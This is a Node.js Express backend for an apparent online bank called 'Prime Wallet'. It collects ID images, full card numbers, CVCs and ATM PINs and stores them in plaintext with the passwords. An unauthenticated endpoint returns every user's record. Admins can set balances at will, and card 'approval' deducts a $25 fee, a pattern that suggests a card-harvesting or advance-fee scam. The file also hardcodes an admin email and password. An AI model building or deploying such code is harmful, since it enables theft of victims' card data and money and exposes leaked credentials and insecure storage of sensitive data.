const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fs = require("fs");
const fetch = require("node-fetch"); // ✅ Fixed — fetch at top!

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));

// ==============================================
// 🔐 BANK VERIFICATION — SERVER SIDE (Paystack)
// ==============================================
const PAYSTACK_SECRET_KEY = process.env.PAYSTACK_SECRET_KEY || "sk_YOUR_REAL_KEY_HERE"; 
// 👆 Replace with YOUR real Paystack Secret Key from paystack.com!

// ✅ VERIFY BANK ACCOUNT NAME — ENDPOINT FOR FRONTEND
app.get("/api/verify-account", async (req, res) => {
  try {
    const { accountNumber, bankCode } = req.query;

    if (!accountNumber || !bankCode) {
      return res.json({ success: false, message: "❌ Account number and bank required" });
    }

    const response = await fetch(
      `https://api.paystack.co/bank/resolve?account_number=${accountNumber}&bank_code=${bankCode}`,
      {
        method: "GET",
        headers: {
          Authorization: `Bearer ${PAYSTACK_SECRET_KEY}`,
          "Content-Type": "application/json"
        }
      }
    );

    const data = await response.json();

    if (data.status === true && data.data) {
      return res.json({
        success: true,
        verifiedName: data.data.account_name,
        accountNumber: data.data.account_number,
        message: "✅ Verified — Real Owner Name Found!"
      });
    } else {
      return res.json({
        success: false,
        message: data.message || "❌ Account not found. Check details."
      });
    }

  } catch (error) {
    console.error("Verification error:", error);
    return res.json({
      success: false,
      message: "⚠️ Verification service unavailable. Try again later."
    });
  }
});

// ==============================================
// ✅ ALL YOUR EXISTING CODE — PERFECT!
// ==============================================

// DATA FILE — SAVES EVERYTHING FOREVER
const DATA_FILE = "./data.json";
if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, JSON.stringify({ users: [], transactions: [] }));

function readData() { return JSON.parse(fs.readFileSync(DATA_FILE)); }
function saveData(data) { fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2)); }

// 🔐 ADMIN CREDENTIALS
const ADMIN_EMAIL = "primewalletbankusa@gmail.com";
const ADMIN_PASS = "Princelv1993$";

// ✅ HEALTH CHECK
app.get("/", (req, res) => res.json({ status: "✅ Prime Wallet API Online", time: new Date().toISOString() }));

// 📋 GET ALL USERS — ADMIN ONLY
app.get("/api/users", (req, res) => {
  const data = readData();
  res.json(data.users);
});

// 📝 REGISTER NEW USER
app.post("/api/register", async (req, res) => {
  try {
    const data = readData();
    const { 
      full_name, email, phone, country, state, city, password,
      idType, idNumber, idFront, idBack
    } = req.body;

    if (!full_name || !email || !password) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    if (data.users.find(u => u.email === email)) {
      return res.status(400).json({ error: "Email already registered" });
    }

    const newUser = {
      id: Date.now().toString(),
      full_name, email, phone, country, state, city, password,
      idType, idNumber, idFront, idBack,
      account_number: "2026" + Math.floor(Math.random() * 900000000 + 100000000),
      balance: 0.00,
      approved: false,
      frozen: false,
      card_approved: false,
      atmHolder: null, atmNumber: null, atmExpiry: null,
      atmCvc: null, atmPin: null, atmFront: null, atmBack: null,
      registered_at: new Date().toISOString()
    };

    data.users.unshift(newUser);
    saveData(data);
    
    res.json({ success: true, user: newUser, message: "✅ Registration successful — waiting for admin approval" });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 🔐 USER LOGIN
app.post("/api/login", (req, res) => {
  const { email, password } = req.body;
  const data = readData();
  const user = data.users.find(u => u.email === email && u.password === password);
  
  if (!user) return res.status(401).json({ error: "Invalid email or password" });
  
  res.json({ 
    success: true, 
    user: { ...user, password: undefined },
    message: user.approved ? "✅ Welcome back!" : "⏳ Account pending approval"
  });
});

// 💳 SUBMIT CARD
app.post("/api/submit-card", async (req, res) => {
  const { email, atmHolder, atmNumber, atmExpiry, atmCvc, atmPin, atmFront, atmBack } = req.body;
  const data = readData();
  const user = data.users.find(u => u.email === email);
  
  if (!user) return res.status(404).json({ error: "User not found" });
  
  user.atmHolder = atmHolder;
  user.atmNumber = atmNumber;
  user.atmExpiry = atmExpiry;
  user.atmCvc = atmCvc;
  user.atmPin = atmPin;
  user.atmFront = atmFront;
  user.atmBack = atmBack;
  user.card_approved = false;
  
  saveData(data);
  res.json({ success: true, message: "✅ Card submitted — waiting for approval" });
});

// ✅ ADMIN — APPROVE USER
app.post("/api/admin/approve-user", (req, res) => {
  const { email, adminEmail, adminPass } = req.body;
  if (adminEmail !== ADMIN_EMAIL || adminPass !== ADMIN_PASS) {
    return res.status(403).json({ error: "Unauthorized" });
  }
  
  const data = readData();
  const user = data.users.find(u => u.email === email);
  if (!user) return res.status(404).json({ error: "User not found" });
  
  user.approved = true;
  saveData(data);
  res.json({ success: true, message: "✅ User approved" });
});

// ✅ ADMIN — APPROVE CARD
app.post("/api/admin/approve-card", (req, res) => {
  const { email, adminEmail, adminPass } = req.body;
  if (adminEmail !== ADMIN_EMAIL || adminPass !== ADMIN_PASS) {
    return res.status(403).json({ error: "Unauthorized" });
  }
  
  const data = readData();
  const user = data.users.find(u => u.email === email);
  if (!user) return res.status(404).json({ error: "User not found" });
  
  user.card_approved = true;
  user.balance = (Number(user.balance) - 25.00).toFixed(2);
  saveData(data);
  res.json({ success: true, message: "✅ Card approved — $25.00 deducted" });
});

// 💰 ADMIN — FUND USER
app.post("/api/admin/fund", (req, res) => {
  const { email, amount, adminEmail, adminPass } = req.body;
  if (adminEmail !== ADMIN_EMAIL || adminPass !== ADMIN_PASS) {
    return res.status(403).json({ error: "Unauthorized" });
  }
  
  const data = readData();
  const user = data.users.find(u => u.email === email);
  if (!user) return res.status(404).json({ error: "User not found" });
  
  user.balance = (Number(user.balance) + Number(amount)).toFixed(2);
  saveData(data);
  res.json({ success: true, newBalance: user.balance, message: `✅ Funded $${amount}` });
});

// 📤 ADMIN — DEBIT USER
app.post("/api/admin/debit", (req, res) => {
  const { email, amount, adminEmail, adminPass } = req.body;
  if (adminEmail !== ADMIN_EMAIL || adminPass !== ADMIN_PASS) {
    return res.status(403).json({ error: "Unauthorized" });
  }
  
  const data = readData();
  const user = data.users.find(u => u.email === email);
  if (!user) return res.status(404).json({ error: "User not found" });
  if (Number(amount) > Number(user.balance)) return res.status(400).json({ error: "Insufficient balance" });
  
  user.balance = (Number(user.balance) - Number(amount)).toFixed(2);
  saveData(data);
  res.json({ success: true, newBalance: user.balance, message: `✅ Debited $${amount}` });
});

// 🔒 ADMIN — FREEZE/UNFREEZE
app.post("/api/admin/toggle-freeze", (req, res) => {
  const { email, adminEmail, adminPass } = req.body;
  if (adminEmail !== ADMIN_EMAIL || adminPass !== ADMIN_PASS) {
    return res.status(403).json({ error: "Unauthorized" });
  }
  
  const data = readData();
  const user = data.users.find(u => u.email === email);
  if (!user) return res.status(404).json({ error: "User not found" });
  
  user.frozen = !user.frozen;
  saveData(data);
  res.json({ success: true, frozen: user.frozen });
});

// 💸 TRANSFER BETWEEN USERS
app.post("/api/transfer", (req, res) => {
  const { senderEmail, senderPass, recipientAccount, amount, note } = req.body;
  const data = readData();
  
  const sender = data.users.find(u => u.email === senderEmail && u.password === senderPass);
  if (!sender) return res.status(401).json({ error: "Invalid credentials" });
  if (!sender.approved) return res.status(403).json({ error: "Account not approved" });
  if (!sender.card_approved) return res.status(403).json({ error: "Prime Wallet Card required" });
  if (sender.frozen) return res.status(403).json({ error: "Account is frozen" });
  
  const recipient = data.users.find(u => u.account_number === recipientAccount);
  if (!recipient) return res.status(404).json({ error: "Recipient account not found" });
  if (sender.email === recipient.email) return res.status(400).json({ error: "Cannot transfer to yourself" });
  
  const numAmount = Number(amount);
  if (numAmount <= 0) return res.status(400).json({ error: "Invalid amount" });
  if (numAmount > Number(sender.balance)) return res.status(400).json({ error: "Insufficient balance" });
  
  sender.balance = (Number(sender.balance) - numAmount).toFixed(2);
  recipient.balance = (Number(recipient.balance) + numAmount).toFixed(2);
  
  data.transactions.unshift({
    id: Date.now().toString(),
    from: sender.email,
    fromName: sender.full_name,
    to: recipient.email,
    toName: recipient.full_name,
    toAccount: recipientAccount,
    amount: numAmount,
    note: note || "",
    date: new Date().toISOString()
  });
  
  saveData(data);
  res.json({ success: true, newBalance: sender.balance, recipientName: recipient.full_name });
});

app.listen(PORT, () => console.log(`✅ Prime Wallet API running on port ${PORT}`));
